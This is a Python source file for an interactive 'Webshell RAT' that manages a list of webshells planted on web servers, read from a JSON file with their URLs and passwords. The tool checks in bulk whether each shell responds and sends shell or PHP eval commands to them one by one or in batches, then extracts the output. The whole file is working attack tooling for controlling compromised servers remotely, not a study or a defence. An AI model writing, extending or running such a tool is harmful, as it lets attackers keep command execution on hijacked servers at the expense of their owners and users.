import re
import sys
import json
import random
import requests
import readline
import concurrent.futures

def completer(text, state):
    func = ['WebshellRAT', 'WebshellRAT.batchExec', 'WebshellRAT.batchRequests', 'webshells', 'php_eval_default', 'exec_default']
    matches = [f for f in func if f.startswith(text)]
    if state < len(matches):
        return matches[state]
    else:
        return None

readline.parse_and_bind('tab: complete')
readline.set_completer(completer)
help_info='''
\033[31mWebshell RAT by Rebel.\033[0m
\033[33mHow to add webshell?\033[0m
    Add your Webshell to data.json, There must be 'func' / 'url' / 'passwd' argument, and of course you can customize everything, because this tool is only about your functions !
    eg. { "func":"exec_default", "url":"http://127.0.0.1/shell.php", "passwd":"pass"}

\033[33mHow do you control the webshell?\033[0m
  After 'WebshellRAT >> ' is displayed, enter any python3 code you want to execute will be eval, the variable wbshells stores all webshells from data.json, and you can execute the command via webshells[0].exec('ls'). 
'''
class Webshell:
    def __init__(self):
        self.func=None
        self.webshellJson=None

    def __str__(self):
        return f"WebshellInfo: {self.webshellJson}"

    def __repr__(self):
        return f"{self.webshellJson['url']}"

    def exec(self, payload):
        result = self.func(self.webshellJson, payload=payload)
        print(f'\033[32m{self.webshellJson["url"]} Execute --------\033[0m')
        print(result if result else f'[{self.webshellJson["url"]}] {payload} Execute Failed....  :(')
        return result

class RAT:
    def __init__(self):
        print("____Rebel's Webshell RAT  ")
        self.webshells=list()
        self.load("data.json")

    def load(self, WebshellFile):
        self.WebshellFile = WebshellFile

        with open(WebshellFile) as _file:
            self.webshellsFileJson=json.load(_file)

        for _id, _webshell in enumerate(self.webshellsFileJson):
            self._webshellJson = _webshell
            print(f"    {_id} : {_webshell}")

            if not globals().get(self._webshellJson['func']):
                print(f"      Error : Function {self._webshellJson['func']} Not Found!")
            
            self.add(
                    globals().get(self._webshellJson['func']),
                    self._webshellJson
            )
            self._webshellJson['func']

    def add(self, func, webshellJson):
        webshell_cache = Webshell()
        webshell_cache.func=func
        webshell_cache.webshellJson=webshellJson
        self.webshells.append(webshell_cache)

    def request(self, func, webshellJson):
        with concurrent.futures.ThreadPoolExecutor( max_workers=5 ) as Executor:
            future = Executor.submit( func, webshellJson)
            return future

    def batchRequests(self):
        for webshell in self.webshells:
            webshell_url = webshell.webshellJson.get('url')
            response = requests.get(webshell_url) 
            if response.status_code==200:
                print( f"\033[32m    [{response.status_code}]  {webshell_url}\033[0m" )
            else:
                print( f"\033[31m    [{response.status_code}]  {webshell_url}\033[0m" )

    def batchExec(self, func, payload):
        return [ _webshell.exec(payload) for _webshell in self.webshells if _webshell.webshellJson['func']==func ]
            
def exec_default(webshellJson, payload="echo 'r4be1'"):
    randomString1 = "".join( random.sample(list('qwetuiopasfgjklzxvbnm'),7) )
    randomString2 = "".join( random.sample(list('qwetuiopasfgjklzxvbnm'),7) )
    payload = f"echo {randomString1};{payload};echo {randomString2};"
    response = requests.post(
            url = webshellJson['url'],
            data = {webshellJson['passwd'] : payload}
            )
    result = response.text[response.text.find(randomString1)+len(randomString1):response.text.find(randomString2)] if (randomString1 in response.text) and (randomString2 in response.text) else None
    return result

def php_eval_default(webshellJson, payload="echo 'r4be1'"):
    randomString1 = "".join( random.sample(list('qwetuiopasfgjklzxvbnm'),7) )
    randomString2 = "".join( random.sample(list('qwetuiopasfgjklzxvbnm'),7) )
    payload = f"echo {randomString1};{payload};echo {randomString2};"
    response = requests.post(
            url = webshellJson['url'],
            data = {webshellJson['passwd'] : payload}
            )
    result = response.text[response.text.find(randomString1)+len(randomString1):response.text.find(randomString2)] if (randomString1 in response.text) and (randomString2 in response.text) else None
    return result


WebshellRAT=RAT()
webshells=WebshellRAT.webshells

while True:
    try:
        _=input('WebshellRAT >> ')
        readline.add_history(_)
        if _ == "exit":
            break
        elif _ == "help":
            print(help_info)
        else:
            eval(_)

    except KeyboardInterrupt:
        print("\n")
        continue

    except Exception as e:
        print(f"Eval Error: {e}")
        continue
